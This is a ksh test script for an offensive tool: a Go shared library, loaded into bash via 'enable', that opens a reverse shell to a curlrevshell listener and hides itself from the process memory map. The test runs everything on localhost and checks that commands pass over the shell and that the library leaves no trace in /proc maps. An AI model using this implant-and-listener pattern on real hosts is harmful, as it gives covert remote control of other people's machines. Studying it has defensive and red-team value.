#!/bin/ksh
#
# debug_output.t
# Check that debug output looks right in the happy case
# By J. Stuart McMurray
# Created 20250728
# Last Modified 20250809

set -euo pipefail

. ./t/shmore.subr

tap_plan 34

CDIR=$(dirname $0)
CDIR=${CDIR%/t}     # Directory with the code we're testing.
CPTO=5m             # Coproces (curlrevshell) timeout.
LIB=curlrevshell.so # Our sneaky library.
MAPS=bash.maps      # Mapped memory after library loading
SOUT=bash.out       # Bash's output
GOUT=go.out         # go install's output
TMPD=$(mktemp -d)   # Temporary directory for test files.
trap 'rm -rf $TMPD; tap_done_testing' EXIT

# Get curlrevshell and start it going.
set +e
GOBIN=$TMPD go install \
        -ldflags "-w -s" \
        -trimpath \
        github.com/magisterquis/curlrevshell@bettertemplates >$TMPD/$GOUT 2>&1
RET=$?
set -e
tap_ok $RET "curlrevshell installed ok" "$0" $LINENO
if [[ 0 -ne $RET ]]; then
        tap_diag "$(<$TMPD/$GOUT)"
        exit 12
fi
CRS=$TMPD/curlrevshell
[[ -x "$CRS" ]]
tap_pass "Got curlrevshell"
timeout "$CPTO" "$CRS" \
        -listen-address 127.0.0.1:0 \
        -no-timestamps \
        -one-shell \
        -tls-certificate-cache "$TMPD/crs.cert" |&
RET=$?
CRSPID=$!
tap_is $RET 0 "Curlrevshell started ok (pid $CRSPID)" "$0" $LINENO
trap 'set +e; rm -rf $TMPD; exec 9>&p; exec 9>&-; wait; tap_done_testing' EXIT

# Get the listen address and fingerprint
SURL=
HASH=
while read -p; do
        if [[ "$REPLY" != curl*https://127.0.0.1:* ]]; then
                continue
        fi
        HASH=$(print -r "$REPLY" | cut -f 4 -d ' ')
        SURL=$(print -r "$REPLY" | cut -f 5 -d ' ')
        SURL=${SURL%/c}
        break
done
tap_like \
        "$SURL" '^https://127.0.0.1:\d+$' \
        "Got Curlrevshell's URL" \
        "$0" $LINENO
tap_like \
        "$HASH" '^sha256//[[:alnum:]+/]{43}=$' \
        "Got Curlrevshell's pubkey fingerprint" \
        "$0" $LINENO
if [[ -z "$SURL" || -z "$HASH" ]]; then
        tap_diag "Bailing due to missing Curlrevshell info"
        exit 11
fi

# Build the library, baking in the server info.
go build \
        -buildmode c-shared \
        -ldflags "
                -X main.PinnedPubKey=$HASH\
                -X main.URL=$SURL/io \
                -s \
                -w \
        " \
        -o "$TMPD/$LIB" \
        -trimpath \
        "./$CDIR"
tap_pass "Shared object file built ok"

# Be in our temporary directory, which is a bit closer to IRL running.
cd "$TMPD"

# One-liner to load our library.
# We use FD 3 as a way to figure out when the libary has finished hooking up
# file descirptors.
# This can't have any double-quotes and all newlines will be replaced with
# spaces.
CMD=$(cat <<'_eof' | tr '\n' ' '
MAXTRIES=1024;
I=0;
while [[ \$I -lt \$MAXTRIES ]]; do
        if [[ /dev/fd/3 -ef /dev/fd/0 ]]; then
                break;
        fi;
        : \$((I++));
        sleep .1;
done;
if [[ \$I -eq \$MAXTRIES ]]; then
        echo \"Command didn't parse in \$MAXTRIES * tenth-seconds\" >&2;
        exit 14;
fi;
enable \"\$LIB\" ||:;
I=0;
while [[ \$I -lt \$MAXTRIES ]]; do
        if ! [[ /dev/fd/3 -ef /dev/fd/0 ]]; then
                break;
        fi;
        sleep .1;
done;
if [[ \$I -eq \$MAXTRIES ]]; then
        echo \"Library wasn't ready in \$MAXTRIES * tenth-seconds\" >&2;
        exit 15;
fi;
exec 3<&-;
cat </proc/\$\$/maps >bash.maps;
_eof
)

# At this point, we'd like test output with failures.
set +e

# Load the library. 
bash -euo pipefail >"$SOUT" 2>&1 <<_eof &
LIB="$LIB";
exec 0<<<"$CMD" 3<&0;
_eof
RET=$?
BPID=$!
tap_is    $RET    0     "Bash started happily"       "$0" $LINENO
tap_like "$BPID" '^\d+' "Got bash's pid (pid $BPID)" "$0" $LINENO

# Wait for shell connected message.
set -A WANTS \
        '' \
        '[127.0.0.1] Shell is ready to go!' \
        'Closing listener, because -one-shell'
I=0
NWANTS=${#WANTS[@]}
while [[ $I -lt $NWANTS ]]; do
        NLINE=$((I+1))
        WANT=${WANTS[$I]}
        read -p
        RET=$?
        tap_ok $RET "Got shell connected line $NLINE/$NWANTS" "$0" $LINENO
        if [[ 0 -ne $RET ]]; then
                tap_diag "Curlrevshell seems gone, bailing"
                tap_diag "Bash's output:"
                tap_diag "$(<$SOUT)"
                exit 13
        fi
        tap_is \
                "$REPLY" "$WANT" \
                "Got correct connected line $NLINE/$NWANTS ($WANT)" \
                "$0" $LINENO
        : $((I++))
done

# check_command sends $1 to the coprocess (curlrevshell)
# back and checks it against $2 with tap_like. 
# The test name and line number are set in $3, $4, respectively.
# check_command emits 3 TAP lines.
#
# Arguments:
# $0 - Script name
# $1 - Line to send
# $2 - Regex against which to check the next line read.
# $3 - Test name
# $4 - Line number
check_command() {
        typeset _line=$1 _regex=$2 _test_name=$3 _lineno=$4
        print -p "$_line"
        tap_ok $? "Successfully sent command - $_test_name" "$0" "$_lineno"
        read -p
        tap_ok $? "Successfully received outpt - $_test_name" "$0" "$_lineno"
        tap_like \
                "$REPLY" "$_regex" \
                "$_test_name - Correct received line" \
                "$0" "$_lineno"
}


# See if we can communicate with the shell.
check_command 'echo Stdout works'     '^Stdout works$' 'Stdout works'  $LINENO
check_command 'echo Stderr works >&2' '^Stderr works$' 'Stderr works'  $LINENO
check_command 'date +%s'              '^\d+$'          'date(1) works' $LINENO
check_command 'ls -l /dev/fd/3 ||:' \
        "^ls: cannot access '/dev/fd/3': No such file or directory\$" \
        'No file descriptor 3' \
        $LINENO
check_command 'echo $$' "^$BPID\$" "Bash's PID correct (pid $BPID)" $LINENO
check_command 'exit 0' \
        '^\[127\.0\.0\.1\] Shell is gone :\($' \
        'Told shell to exit' \
        $LINENO

# Things from here should work.
set -e

# Make sure bash's output looks right.
GOT=$(<./"$SOUT")
WANT="bash: line 3: enable: cannot find ${LIB}_struct in shared object ${LIB}: ./${LIB}: undefined symbol: ${LIB}_struct
bash: line 3: enable: ${LIB}: not a shell builtin"
tap_is "$GOT" "$WANT" "Correct output from loading the library" "$0" $LINENO

# Make sure the library's hidden.
GOT=$(grep "$LIB" "$MAPS" ||:)
tap_is "$GOT" "" "No mapped memory for $LIB" "$0" $LINENO

# vim: ft=sh
